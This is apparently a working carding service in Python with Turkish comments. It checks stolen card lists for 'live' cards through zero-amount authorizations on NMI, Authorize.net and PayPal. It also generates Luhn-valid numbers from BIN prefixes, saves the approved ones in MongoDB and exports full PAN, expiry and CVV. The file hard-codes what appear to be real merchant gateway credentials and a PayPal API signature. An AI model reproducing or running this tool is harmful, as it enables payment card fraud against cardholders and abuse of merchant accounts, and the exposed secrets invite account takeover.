from fastapi import FastAPI, UploadFile, File, Depends, HTTPException, Security
from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
from pydantic import BaseModel
import requests
import re
import time
import random
import hashlib
import csv
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any
from datetime import datetime
import json
import os
import logging
from pathlib import Path
from pymongo import MongoClient

# ================== LOGGING ==================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="Advanced Live Checker + BIN API + Perfect Generator")
security = HTTPBearer()

# ================== AUTH ==================
AUTH_TOKEN = os.getenv("AUTH_TOKEN", "b9f3k7m2v8t3w5z1q6p9c4b7n2v8m2025")

def verify_auth(credentials: HTTPAuthorizationCredentials = Security(security)):
    if credentials.credentials != AUTH_TOKEN:
        raise HTTPException(status_code=401, detail="Geçersiz token")
    return credentials.credentials

# ================== MONGODB ==================
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://paymentmanger.gvaavzc.mongodb.net/?authSource=%24external&authMechanism=MONGODB-X509&appName=paymentmanger")

try:
    client = MongoClient(MONGODB_URI, tls=True, tlsAllowInvalidCertificates=True)
    db = client["paymentmanger"]
    collection = db["live_balance_results"]
    generated_cards_collection = db["generatedCards"]
    logger.info("[+] MongoDB bağlantısı başarılı")
except Exception as e:
    logger.error(f"[!] MongoDB hatası: {e}")
    client = None
    collection = None
    generated_cards_collection = None

# ================== MODELS ==================
class CardCheckRequest(BaseModel):
    bin: Optional[str] = None
    pan: Optional[str] = None
    cardNumber: Optional[str] = None
    exp: Optional[str] = None
    expMonth: Optional[str] = None
    expYear: Optional[str] = None
    cvv: Optional[str] = None
    cvv2: Optional[str] = None
    cvc: Optional[str] = None
    zip: Optional[str] = None
    billingZip: Optional[str] = None
    postalCode: Optional[str] = None
    holderName: Optional[str] = None
    provider: Optional[str] = "clover"
    operation: Optional[str] = "verification"
    amount: Optional[float] = 0.1
    currency: Optional[str] = "USD"

class BatchCheckRequest(BaseModel):
    cards: List[str]
    provider: Optional[str] = "auto"
    operation: Optional[str] = "verification"

class GenerateRequest(BaseModel):
    prefix: str
    quantity: int = 10
    max_attempts: int = 200
    provider: str = "nmi"
    exp_month: Optional[str] = None
    exp_year: Optional[str] = None
    cvv: Optional[str] = None
    billing_zip: str = "00000"
    save_to_db: bool = True

# ================== PROVIDER LIST ==================
PROVIDERS = [{"name": "clover", "status": "untested", "last_check": None}]

PROVIDER_STATS = {p["name"]: {"success": 0, "fail": 0, "total": 0} for p in PROVIDERS}
PROVIDER_INDEX = 0



CLOVER_CONFIG = {
    "merchant_id": os.getenv("CLOVER_MERCHANT_ID", "518993421163932"),
    "public_token": os.getenv("CLOVER_PUBLIC_TOKEN", "cc5f1f800dad9399d3e46aca8da49d8f"),
    "private_token": os.getenv("CLOVER_PRIVATE_TOKEN", "c7ee250b-e9ae-ab59-ba52-616ecc63ed29"),
    "token_url": "https://token.clover.com/v1/tokens",
    "charge_url": "https://api.clover.com/v1/charges"
}

MOCK_MODE = os.getenv("MOCK_MODE", "true").lower() in ["1", "true", "yes", "on"]

NMI_CONFIG = {
    "username": os.getenv("NMI_USERNAME", ""),
    "password": os.getenv("NMI_PASSWORD", ""),
    "url": os.getenv("NMI_URL", "https://secure.nmi.com/api/transact.php")
}

GLOBALPAYMENTS_CONFIG = {
    "public_token": os.getenv("GLOBALPAYMENTS_PUBLIC_TOKEN", ""),
    "private_token": os.getenv("GLOBALPAYMENTS_PRIVATE_TOKEN", ""),
    "token_url": os.getenv("GLOBALPAYMENTS_TOKEN_URL", "https://api.globalpay.com/v1/tokens"),
    "charge_url": os.getenv("GLOBALPAYMENTS_CHARGE_URL", "https://api.globalpay.com/v1/charges")
}

# ================== HELPER FUNCTIONS ==================

def digits_only(value: Any) -> str:
    if value is None:
        return ""
    return re.sub(r'\D', '', str(value))

def mask_pan(pan: str) -> str:
    if not pan or len(pan) < 10:
        return pan
    return f"{pan[:6]}****{pan[-4:]}"

def luhn_checksum(partial: str) -> int:
    total = 0
    should_double = True
    for digit in reversed(partial):
        d = int(digit)
        if should_double:
            d *= 2
            if d > 9:
                d -= 9
        total += d
        should_double = not should_double
    return (10 - (total % 10)) % 10

def hash_seed(seed: str) -> str:
    return hashlib.sha256(str(seed).encode()).hexdigest()

def seeded_digit(seed: str, index: int) -> int:
    digest = hash_seed(f"{seed}:{index}")
    return ord(digest[index % len(digest)]) % 10

def infer_card_length(prefix: str) -> int:
    return 15 if prefix.startswith(('34', '37')) else 16

def infer_cvv_length(prefix: str) -> int:
    return 4 if prefix.startswith(('34', '37')) else 3

def infer_brand(prefix: str) -> str:
    if prefix.startswith('4'):
        return "VISA"
    first_two = int(prefix[:2]) if len(prefix) >= 2 else 0
    first_four = int(prefix[:4]) if len(prefix) >= 4 else 0
    if (51 <= first_two <= 55) or (2221 <= first_four <= 2720):
        return "MASTERCARD"
    if prefix.startswith(('34', '37')):
        return "AMEX"
    if prefix.startswith(('6011', '65')):
        return "DISCOVER"
    return "UNKNOWN"

def infer_level(prefix: str) -> str:
    brand = infer_brand(prefix)
    if brand == "VISA":
        return "CLASSIC"
    elif brand == "MASTERCARD":
        return "STANDARD"
    elif brand == "AMEX":
        return "GREEN"
    return "STANDARD"

def infer_country(prefix: str) -> str:
    return "US"

def normalize_expiry(value: Any) -> Optional[Dict]:
    if not value:
        return None
    text = str(value).strip()
    compact = digits_only(text)
    month = ""
    year = ""
    if "/" in text or "-" in text:
        parts = re.split(r'[/-]', text)
        month = digits_only(parts[0]) if len(parts) > 0 else ""
        year = digits_only(parts[1]) if len(parts) > 1 else ""
    elif len(compact) >= 4:
        month = compact[:2]
        year = compact[2:4] if len(compact) >= 4 else ""
        if len(compact) >= 6:
            year = compact[2:6]
    if not month or not year:
        return None
    month = month.zfill(2)
    if len(year) == 2:
        year = f"20{year}"
    if not re.match(r'^(0[1-9]|1[0-2])$', month) or not re.match(r'^\d{4}$', year):
        return None
    return {"month": month, "year": year, "label": f"{month}/{year[-2:]}"}

def normalize_card_input(payload: Dict) -> Dict:
    pan = digits_only(payload.get("pan") or payload.get("cardNumber") or payload.get("cardnumber") or payload.get("number") or "")
    expiry = normalize_expiry(payload.get("exp") or payload.get("expiry") or f"{payload.get('expMonth', '')}/{payload.get('expYear', '')}")
    if len(pan) < 12 or len(pan) > 19:
        raise ValueError("cardnumber must be 12-19 digits")
    if not expiry:
        raise ValueError("exp must be MM/YY or MM/YYYY")
    return {
        "pan": pan,
        "expMonth": expiry["month"],
        "expYear": expiry["year"],
        "exp": expiry["label"],
        "cvv": str(payload.get("cvv") or payload.get("cvv2") or payload.get("cvc") or "").strip(),
        "zip": str(payload.get("zip") or payload.get("billingZip") or payload.get("postalCode") or "00000").strip() or "00000",
        "holderName": str(payload.get("holderName") or payload.get("cardholderName") or payload.get("name") or "").strip()
    }

def parse_card_line(line: str) -> Dict:
    parts = [p.strip() for p in str(line).strip().split("|") if p.strip()]
    if len(parts) < 3:
        raise ValueError(f"Invalid card format: {line}")
    pan = parts[0]
    if "/" in parts[1]:
        expiry = parts[1]
        cvv = parts[2] if len(parts) > 2 else ""
        zip_code = parts[3] if len(parts) > 3 else "00000"
    else:
        month = parts[1].zfill(2)
        year = parts[2]
        if len(year) == 2:
            year = f"20{year}"
        expiry = f"{month}/{year}"
        cvv = parts[3] if len(parts) > 3 else ""
        zip_code = parts[4] if len(parts) > 4 else "00000"
    return normalize_card_input({"cardNumber": pan, "exp": expiry, "cvv": cvv, "zip": zip_code})

# ================== BIN LOOKUP ==================
class BinLookup:
    def __init__(self):
        self.cache = {}
        self.csv_path = Path(__file__).resolve().parent / "bin-data.csv"
        self.csv_index = None
        self.csv_mtime = None

    def _load_csv_index(self) -> Dict[str, Dict]:
        if not self.csv_path.exists():
            raise FileNotFoundError(f"BIN data file not found: {self.csv_path}")

        mtime = self.csv_path.stat().st_mtime
        if self.csv_index is not None and self.csv_mtime == mtime:
            return self.csv_index

        index = {}
        with self.csv_path.open("r", encoding="utf-8-sig", newline="") as csv_file:
            reader = csv.DictReader(csv_file)
            for row in reader:
                bin_value = digits_only(row.get("BIN"))[:6]
                if len(bin_value) == 6 and bin_value not in index:
                    index[bin_value] = row

        self.csv_index = index
        self.csv_mtime = mtime
        logger.info(f"[BIN] {len(index)} BIN kaydı bin-data.csv dosyasından yüklendi")
        return index

    def _row_to_result(self, bin_6: str, row: Dict) -> Dict:
        category = str(row.get("Category") or "").strip().upper()
        card_type = str(row.get("Type") or "").strip().upper() or "UNKNOWN"
        brand = str(row.get("Brand") or "").strip().upper() or "UNKNOWN"
        issuer = str(row.get("Issuer") or "").strip() or "Unknown"
        country = str(row.get("isoCode2") or "").strip().upper() or "XX"
        country_name = str(row.get("CountryName") or "").strip() or "Unknown"
        level = category or "STANDARD"

        return {
            "bin": bin_6,
            "brand": brand,
            "type": card_type,
            "level": level,
            "level_detail": f"{level.title()} Card" if level != "STANDARD" else "Standard Card",
            "bank": issuer,
            "issuer_phone": str(row.get("IssuerPhone") or "").strip(),
            "issuer_url": str(row.get("IssuerUrl") or "").strip(),
            "country": country,
            "country_name": country_name,
            "country_alpha3": str(row.get("isoCode3") or "").strip().upper(),
            "currency": "USD",
            "prepaid": "PREPAID" in category,
            "commercial": any(term in category for term in ["BUSINESS", "CORPORATE", "COMMERCIAL"]),
            "source": "bin-data.csv",
            "valid": True
        }

    def get_bin_info(self, bin_number: str) -> Dict:
        bin_6 = digits_only(bin_number)[:6]
        if bin_6 in self.cache:
            return self.cache[bin_6]
        result = {"bin": bin_6, "brand": "UNKNOWN", "type": "UNKNOWN", "level": "STANDARD", "level_detail": "Standard Card", "bank": "Unknown", "country": "XX", "country_name": "Unknown", "currency": "USD", "prepaid": False, "commercial": False, "source": "none", "valid": False}
        try:
            row = self._load_csv_index().get(bin_6)
            if row:
                result.update(self._row_to_result(bin_6, row))
        except Exception as e:
            logger.warning(f"[BIN] Hata: {e}")
        self.cache[bin_6] = result
        return result

bin_lookup_service = BinLookup()

# ================== ASYNC BIN CHECK ==================
async def bin_check_card(card_data: Dict) -> Dict:
    pan = card_data.get("pan", "")
    bin_6 = digits_only(pan)[:6]
    if not bin_6 or len(bin_6) < 6:
        return {"status": "failed", "bin": bin_6, "error": "Invalid BIN"}
    bin_info = bin_lookup_service.get_bin_info(bin_6)
    return {
        "status": "passed" if bin_info.get("valid") else "failed",
        "bin": bin_6,
        "summary": {
            "brand": bin_info.get("brand"),
            "type": bin_info.get("type"),
            "level": bin_info.get("level"),
            "level_detail": bin_info.get("level_detail"),
            "bank": bin_info.get("bank"),
            "country": bin_info.get("country"),
            "countryName": bin_info.get("country_name"),
            "currency": bin_info.get("currency"),
            "prepaid": bin_info.get("prepaid"),
            "commercial": bin_info.get("commercial")
        },
        "raw": bin_info
    }

# ================== PROVIDER SERVICES ==================

class ProviderService:
    def __init__(self):
        self.nmi_config = NMI_CONFIG
        self.authorize_config = {
            "login_id": os.getenv("AUTHORIZE_LOGIN_ID", "6Px6beH4B4T"),
            "transaction_key": os.getenv("AUTHORIZE_TRANSACTION_KEY", "34677Ck24M5zvuTM"),
            "url": "https://api.authorize.net/xml/v1/request.api"
        }
        self.paypal_config = {
            "username": os.getenv("PAYPAL_API_USERNAME", "gazanfarsirinov_api1.zohomail.eu"),
            "password": os.getenv("PAYPAL_API_PASSWORD", "OBOU2RJGGEHDMFZT"),
            "signature": os.getenv("PAYPAL_API_SIGNATURE", "AcMDoql-aVqyCJXCMFDSFlti7T7MA1GADoKxORsg6qHLCm2sGHW9aJ2R"),
            "nvp_url": os.getenv("PAYPAL_NVP_BASE_URL", "https://api-3t.paypal.com/nvp")
        }
    async def verify_card(self, card_data: Dict, provider: str) -> Dict:
        if MOCK_MODE:
            is_live = random.random() < 0.15
            return {"status": "approved" if is_live else "declined", "transactionId": f"mock_{hashlib.md5(card_data['pan'].encode()).hexdigest()[:16]}", "provider": provider, "isLive": is_live}
        if provider == "clover":
            return self._nmi_verify(card_data)
        elif provider == "authorizenet":
            return self._authorize_verify(card_data)
        elif provider == "paypal":
            return self._paypal_verify(card_data)
        return {"status": "declined", "isLive": False, "provider": provider}

    def _nmi_verify(self, card_data: Dict) -> Dict:
        try:
            data = {"username": self.nmi_config["username"], "password": self.nmi_config["password"], "ccnumber": card_data["pan"], "ccexp": f"{card_data['expMonth']}{card_data['expYear'][-2:]}", "cvv": card_data["cvv"], "type": "verify", "amount": "0.00"}
            response = requests.post(self.nmi_config["url"], data=data, timeout=15, headers={"Content-Type": "application/x-www-form-urlencoded"})
            params = dict(x.split('=') for x in response.text.split('&'))
            response_code = params.get('response', '0')
            return {"status": "approved" if response_code == '1' else "declined", "transactionId": params.get('transactionid', ''), "authCode": params.get('authcode', ''), "responseCode": response_code, "responseText": params.get('responsetext', ''), "provider": "clover", "isLive": response_code == '1'}
        except Exception as e:
            return {"status": "error", "isLive": False, "error": str(e)}

    def _authorize_verify(self, card_data: Dict) -> Dict:
        try:
            xml_request = f"""<?xml version="1.0" encoding="utf-8"?>
            <createTransactionRequest xmlns="AnetApi/xml/v1/schema/AnetApiSchema.xsd">
                <merchantAuthentication><name>{self.authorize_config['login_id']}</name><transactionKey>{self.authorize_config['transaction_key']}</transactionKey></merchantAuthentication>
                <transactionRequest><transactionType>authOnly</transactionType><amount>0.00</amount>
                <payment><creditCard><cardNumber>{card_data['pan']}</cardNumber><expirationDate>{card_data['expYear']}-{card_data['expMonth']}</expirationDate><cardCode>{card_data['cvv']}</cardCode></creditCard></payment>
                </transactionRequest>
            </createTransactionRequest>"""
            response = requests.post(self.authorize_config["url"], data=xml_request, headers={"Content-Type": "application/xml"}, timeout=15)
            root = ET.fromstring(response.text)
            for elem in root.getiterator():
                if '}' in elem.tag:
                    elem.tag = elem.tag.split('}', 1)[1]
            trans_response = root.find('.//transactionResponse')
            if trans_response is not None:
                response_code = trans_response.findtext('responseCode', '0')
                return {"status": "approved" if response_code == '1' else "declined", "transactionId": trans_response.findtext('transId', ''), "authCode": trans_response.findtext('authCode', ''), "responseCode": response_code, "provider": "authorizenet", "isLive": response_code == '1'}
            return {"status": "declined", "isLive": False, "provider": "authorizenet"}
        except Exception as e:
            return {"status": "error", "isLive": False, "error": str(e)}

    def _paypal_verify(self, card_data: Dict) -> Dict:
        try:
            data = {"METHOD": "DoDirectPayment", "VERSION": "124.0", "USER": self.paypal_config["username"], "PWD": self.paypal_config["password"], "SIGNATURE": self.paypal_config["signature"], "PAYMENTACTION": "Authorization", "AMT": "0.00", "CREDITCARDTYPE": "Visa", "ACCT": card_data["pan"], "EXPDATE": f"{card_data['expMonth']}{card_data['expYear'][-2:]}", "CVV2": card_data["cvv"], "FIRSTNAME": "Test", "LASTNAME": "User", "STREET": "123 Main St", "CITY": "New York", "STATE": "NY", "ZIP": card_data.get("zip", "10001"), "COUNTRYCODE": "US"}
            response = requests.post(self.paypal_config["nvp_url"], data=data, timeout=15)
            params = dict(x.split('=') for x in response.text.split('&'))
            ack = params.get('ACK', 'Failure')
            return {"status": "approved" if ack.upper() == "SUCCESS" else "declined", "transactionId": params.get('TRANSACTIONID', ''), "correlationId": params.get('CORRELATIONID', ''), "provider": "paypal", "isLive": ack.upper() == "SUCCESS"}
        except Exception as e:
            return {"status": "error", "isLive": False, "error": str(e)}

provider_service = ProviderService()

# ================== VERIFY WITH PROVIDER (Generator için) ==================

def verify_with_provider(card: Dict, provider: str = "nmi") -> Dict:
    if provider == "nmi":
        try:
            data = {"username": NMI_CONFIG["username"], "password": NMI_CONFIG["password"], "ccnumber": card["pan"], "ccexp": f"{card['expMonth']}{card['expYear'][-2:]}", "cvv": card["cvv"], "type": "verify", "amount": "0.00"}
            response = requests.post(NMI_CONFIG["url"], data=data, timeout=15, headers={"Content-Type": "application/x-www-form-urlencoded"})
            params = dict(x.split('=') for x in response.text.split('&'))
            response_code = params.get('response', '0')
            return {"status": "approved" if response_code == '1' else "declined", "transactionId": params.get('transactionid', ''), "authCode": params.get('authcode', ''), "responseCode": response_code, "responseText": params.get('responsetext', ''), "provider": "nmi", "isLive": response_code == '1'}
        except Exception as e:
            return {"status": "error", "isLive": False, "error": str(e)}
    elif provider == "globalpayments":
        try:
            token_payload = {"card": {"number": card["pan"], "exp_month": int(card["expMonth"]), "exp_year": int(card["expYear"]), "cvv": card["cvv"]}}
            token_headers = {"Content-Type": "application/json", "apikey": GLOBALPAYMENTS_CONFIG["public_token"]}
            token_response = requests.post(GLOBALPAYMENTS_CONFIG["token_url"], json=token_payload, headers=token_headers, timeout=10)
            if token_response.status_code != 200:
                return {"status": "error", "isLive": False, "error": "Tokenization failed", "provider": "globalpayments"}
            token_data = token_response.json()
            token_id = token_data.get("id")
            if not token_id:
                return {"status": "error", "isLive": False, "error": "No token", "provider": "globalpayments"}
            charge_payload = {"amount": 50, "currency": "usd", "source": token_id, "capture": False}
            charge_headers = {"Content-Type": "application/json", "Authorization": f"Bearer {GLOBALPAYMENTS_CONFIG['private_token']}"}
            charge_response = requests.post(GLOBALPAYMENTS_CONFIG["charge_url"], json=charge_payload, headers=charge_headers, timeout=10)
            if charge_response.status_code in [200, 201, 202]:
                charge_data = charge_response.json()
                is_live = charge_data.get("status") in ["succeeded", "approved", "authorized"]
                return {"status": "approved" if is_live else "declined", "transactionId": charge_data.get("id", ""), "provider": "globalpayments", "isLive": is_live}
            return {"status": "error", "isLive": False, "error": "Charge failed", "provider": "globalpayments"}
        except Exception as e:
            return {"status": "error", "isLive": False, "error": str(e)}
    return {"status": "error", "isLive": False, "error": f"Unknown provider: {provider}"}

# ================== PERFECT GENERATOR ==================

def generate_pan(prefix: str, seed: str, attempt: int) -> str:
    card_length = infer_card_length(prefix)
    body_length = card_length - len(prefix) - 1
    if body_length < 1:
        raise ValueError(f"Prefix must be shorter than {card_length} digits")
    body = ""
    for i in range(body_length):
        body += str(seeded_digit(seed, attempt * 31 + i))
    partial = f"{prefix}{body}"
    return f"{partial}{luhn_checksum(partial)}"

def generate_expiry(seed: str, attempt: int) -> Dict:
    now = datetime.now()
    month = str((seeded_digit(seed, attempt + 11) % 12) + 1).zfill(2)
    year = str(now.year + 1 + (seeded_digit(seed, attempt + 17) % 5))
    return {"expMonth": month, "expYear": year}

def generate_cvv(prefix: str, seed: str, attempt: int) -> str:
    length = infer_cvv_length(prefix)
    cvv = ""
    for i in range(length):
        cvv += str(seeded_digit(seed, attempt * 13 + i))
    return cvv

def normalize_expiry_generator(month: str, year: str, seed: str, attempt: int) -> Dict:
    if month and year:
        exp_month = str(month).zfill(2)
        exp_year = str(year)
        if len(exp_year) == 2:
            exp_year = f"20{exp_year}"
        return {"expMonth": exp_month, "expYear": exp_year}
    return generate_expiry(seed, attempt)

def build_candidate(prefix: str, seed: str, attempt: int, exp_month: str = None, exp_year: str = None, cvv: str = None, billing_zip: str = "00000") -> Dict:
    pan = generate_pan(prefix, seed, attempt)
    expiry = normalize_expiry_generator(exp_month, exp_year, seed, attempt)
    return {"pan": pan, "first6": pan[:6], "last4": pan[-4:], "masked": mask_pan(pan), "expMonth": expiry["expMonth"], "expYear": expiry["expYear"], "expiry": f"{expiry['expMonth']}/{expiry['expYear'][-2:]}", "cvv": digits_only(cvv) or generate_cvv(prefix, seed, attempt), "billingZip": digits_only(billing_zip) or "00000", "brand": infer_brand(prefix), "level": infer_level(prefix), "country": infer_country(prefix), "cardLength": infer_card_length(prefix), "cvvLength": infer_cvv_length(prefix), "luhnValid": True}

def save_generated_card(card: Dict, verification: Dict, run_id: str, provider: str) -> Dict:
    if not generated_cards_collection:
        return {"saved": False, "error": "MongoDB not connected"}
    doc = {"runId": run_id, "pan": card["pan"], "first6": card["first6"], "last4": card["last4"], "masked": card["masked"], "expMonth": card["expMonth"], "expYear": card["expYear"], "expiry": card["expiry"], "cvv": card["cvv"], "billingZip": card["billingZip"], "brand": card["brand"], "level": card["level"], "country": card["country"], "provider": provider, "providerStatus": verification.get("status"), "transactionId": verification.get("transactionId", ""), "authCode": verification.get("authCode", ""), "responseCode": verification.get("responseCode", ""), "responseText": verification.get("responseText", ""), "isLive": True, "sandboxVerified": True, "createdAt": datetime.now().isoformat(), "updatedAt": datetime.now().isoformat()}
    try:
        generated_cards_collection.insert_one(doc)
        logger.info(f"[DB] Kart kaydedildi: {card['masked']}")
        return {"saved": True, "id": str(doc["_id"])}
    except Exception as e:
        logger.error(f"[DB] Kayıt hatası: {e}")
        return {"saved": False, "error": str(e)}

def generate_cards(request: GenerateRequest) -> Dict:
    prefix = digits_only(request.prefix)
    if len(prefix) < 6 or len(prefix) > 12:
        raise ValueError("Prefix must be 6-12 digits")
    if request.quantity < 1 or request.quantity > 25:
        raise ValueError("Quantity must be 1-25")
    provider = request.provider.lower()
    if provider not in ["nmi", "globalpayments"]:
        raise ValueError("Provider must be nmi or globalpayments")
    seed = f"{provider}:{prefix}:sandbox"
    run_id = f"gen_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{hashlib.md5(seed.encode()).hexdigest()[:6]}"
    valid_cards = []
    attempts_log = []
    seen = set()
    for attempt_no in range(1, request.max_attempts + 1):
        if len(valid_cards) >= request.quantity:
            break
        card = build_candidate(prefix, seed, attempt_no, request.exp_month, request.exp_year, request.cvv, request.billing_zip)
        fingerprint = f"{card['pan']}|{card['expMonth']}|{card['expYear']}|{card['cvv']}"
        if fingerprint in seen:
            continue
        seen.add(fingerprint)
        verification = verify_with_provider(card, provider)
        is_live = verification.get("isLive", False)
        if is_live:
            card_data = {**card, "verification": verification, "sandboxVerified": True, "liveEquivalent": True}
            if request.save_to_db:
                save_result = save_generated_card(card, verification, run_id, provider)
                card_data["dbSaved"] = save_result.get("saved", False)
            valid_cards.append(card_data)
            logger.info(f"[GEN] ✅ LIVE: {card['masked']} | {card['brand']}")
        else:
            logger.debug(f"[GEN] ❌ DEAD: {card['masked']}")
        attempts_log.append({"attempt": attempt_no, "status": "success" if is_live else "failed", "providerStatus": verification.get("status", "unknown"), "providerApproved": is_live, "cardMasked": card["masked"], "isLive": is_live})
        time.sleep(0.3)
    total_attempts = len(attempts_log)
    live_count = len(valid_cards)
    return {"runId": run_id, "status": "completed" if live_count >= request.quantity else "partial", "provider": provider, "prefix": prefix, "quantity": request.quantity, "maxAttempts": request.max_attempts, "totalAttempts": total_attempts, "liveCount": live_count, "deadCount": total_attempts - live_count, "successRate": (live_count/total_attempts*100) if total_attempts > 0 else 0, "validCards": valid_cards, "attemptsLog": attempts_log}

# ================== API ENDPOINTS ==================

@app.get("/")
async def home():
    return {
        "status": "API aktif",
        "mock_mode": MOCK_MODE,
        "providers": ["clover", "authorizenet", "paypal", "amazonpay", "nmi", "globalpayments"],
        "endpoints": [
            "/check (POST)",
            "/check/batch (POST)",
            "/check/file (POST)",
            "/bin/lookup (POST)",
            "/generate (POST)",
            "/cards/list (GET)",
            "/cards/stats (GET)",
            "/cards/export (POST)",
            "/health (GET)"
        ],
        "auth_required": "Bearer token ile"
    }

@app.get("/health")
async def health():
    return {
        "status": "healthy",
        "mock_mode": MOCK_MODE,
        "timestamp": datetime.now().isoformat(),
        "mongodb": generated_cards_collection is not None
    }

@app.post("/check")
async def check_single_card(request: CardCheckRequest, auth: str = Depends(verify_auth)):
    try:
        payload = request.dict(exclude_none=True)
        provider = payload.pop("provider", "clover")
        operation = payload.pop("operation", "verification")
        card_data = normalize_card_input(payload)
        bin_result = await bin_check_card(card_data)
        live_result = await provider_service.verify_card(card_data, provider)
        return {
            "status": "passed" if live_result.get("isLive") else "review",
            "card": {
                "pan": mask_pan(card_data["pan"]),
                "exp": card_data["exp"],
                "zip": card_data["zip"],
                "holder": card_data.get("holderName", "")
            },
            "live": live_result,
            "binCheck": bin_result,
            "provider": provider,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        logger.error(f"[API] Hata: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/check/batch")
async def check_batch_cards(request: BatchCheckRequest, auth: str = Depends(verify_auth)):
    try:
        results = []
        provider = request.provider or "auto"
        for card_line in request.cards:
            try:
                card_data = parse_card_line(card_line)
                bin_result = await bin_check_card(card_data)
                live_result = await provider_service.verify_card(card_data, provider if provider != "auto" else "clover")
                results.append({
                    "status": "passed" if live_result.get("isLive") else "review",
                    "card": {"pan": mask_pan(card_data["pan"]), "exp": card_data["exp"]},
                    "live": live_result,
                    "binCheck": bin_result
                })
            except Exception as e:
                results.append({"status": "error", "error": str(e), "raw": card_line})
            time.sleep(0.3)
        total = len(results)
        live = sum(1 for r in results if r.get("status") == "passed")
        return {"total": total, "live": live, "dead": total - live, "results": results}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/check/file")
async def check_file(file: UploadFile, provider: str = "clover", auth: str = Depends(verify_auth)):
    try:
        content = await file.read()
        lines = [line.strip() for line in content.decode('utf-8').split('\n') if line.strip() and not line.startswith('#')]
        results = []
        for line in lines:
            try:
                card_data = parse_card_line(line)
                bin_result = await bin_check_card(card_data)
                live_result = await provider_service.verify_card(card_data, provider)
                results.append({
                    "status": "passed" if live_result.get("isLive") else "review",
                    "card": {"pan": mask_pan(card_data["pan"]), "exp": card_data["exp"]},
                    "live": live_result,
                    "binCheck": bin_result
                })
            except Exception as e:
                results.append({"status": "error", "error": str(e), "raw": line})
            time.sleep(0.3)
        return {
            "total": len(results),
            "live": sum(1 for r in results if r.get("status") == "passed"),
            "dead": sum(1 for r in results if r.get("status") == "review"),
            "results": results
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

def format_bin_lookup_response(bin_info: Dict) -> Dict:
    return {
        "bin": bin_info["bin"],
        "brand": bin_info["brand"],
        "type": bin_info["type"],
        "level": bin_info["level"],
        "level_detail": bin_info["level_detail"],
        "bank": bin_info["bank"],
        "issuer_phone": bin_info.get("issuer_phone", ""),
        "issuer_url": bin_info.get("issuer_url", ""),
        "country": bin_info["country"],
        "country_name": bin_info["country_name"],
        "country_alpha3": bin_info.get("country_alpha3", ""),
        "currency": bin_info["currency"],
        "prepaid": bin_info["prepaid"],
        "commercial": bin_info["commercial"],
        "source": bin_info["source"],
        "valid": bin_info["valid"],
        "timestamp": datetime.now().isoformat()
    }

@app.post("/bin/lookup")
async def lookup_bin_endpoint(request: CardCheckRequest, auth: str = Depends(verify_auth)):
    try:
        pan = digits_only(request.bin or request.pan or request.cardNumber or "")
        if len(pan) < 6:
            raise HTTPException(status_code=400, detail="Card number must be at least 6 digits")
        bin_info = bin_lookup_service.get_bin_info(pan[:6])
        return format_bin_lookup_response(bin_info)
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[API] BIN lookup hatası: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/checkers/bincheck")
async def api_bincheck_endpoint(request: CardCheckRequest, auth: str = Depends(verify_auth)):
    return await lookup_bin_endpoint(request, auth)

# ================== GENERATOR ENDPOINTS ==================

@app.post("/generate")
async def generate_cards_endpoint(
    request: GenerateRequest,
    auth: str = Depends(verify_auth)
):
    """Yeni kart üret - BIN prefix'ine göre live kartlar üretir"""
    try:
        result = generate_cards(request)
        return result
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    except Exception as e:
        logger.error(f"[API] Hata: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/cards/list")
async def list_cards(
    limit: int = 50,
    brand: Optional[str] = None,
    auth: str = Depends(verify_auth)
):
    """Kayıtlı live kartları listele"""
    if not generated_cards_collection:
        raise HTTPException(status_code=503, detail="MongoDB not connected")
    
    query = {"isLive": True}
    if brand:
        query["brand"] = brand.upper()
    
    try:
        cursor = generated_cards_collection.find(query).sort("createdAt", -1).limit(limit)
        cards = []
        for doc in cursor:
            doc["_id"] = str(doc["_id"])
            cards.append(doc)
        return {
            "total": len(cards),
            "cards": cards
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/cards/stats")
async def card_stats(auth: str = Depends(verify_auth)):
    """Live kart istatistikleri"""
    if not generated_cards_collection:
        raise HTTPException(status_code=503, detail="MongoDB not connected")
    
    try:
        total = generated_cards_collection.count_documents({"isLive": True})
        
        brand_stats = generated_cards_collection.aggregate([
            {"$match": {"isLive": True}},
            {"$group": {"_id": "$brand", "count": {"$sum": 1}}}
        ])
        
        brands = {}
        for item in brand_stats:
            brands[item["_id"]] = item["count"]
        
        return {
            "totalLiveCards": total,
            "brands": brands,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/cards/export")
async def export_cards(
    format: str = "csv",
    auth: str = Depends(verify_auth)
):
    """Live kartları CSV veya JSON olarak dışa aktar"""
    if not generated_cards_collection:
        raise HTTPException(status_code=503, detail="MongoDB not connected")
    
    try:
        cards = list(generated_cards_collection.find({"isLive": True}))
        
        if format.lower() == "csv":
            header = "PAN,ExpMonth,ExpYear,CVV,Brand,Level,Country,TransactionId,Provider,CreatedAt\n"
            lines = []
            for card in cards:
                lines.append(f"{card['pan']},{card['expMonth']},{card['expYear']},{card['cvv']},{card['brand']},{card['level']},{card['country']},{card.get('transactionId', '')},{card['provider']},{card.get('createdAt', '')}")
            return {
                "format": "csv",
                "content": header + "\n".join(lines),
                "count": len(cards)
            }
        else:
            for card in cards:
                card["_id"] = str(card["_id"])
            return {
                "format": "json",
                "cards": cards,
                "count": len(cards)
            }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=10000)
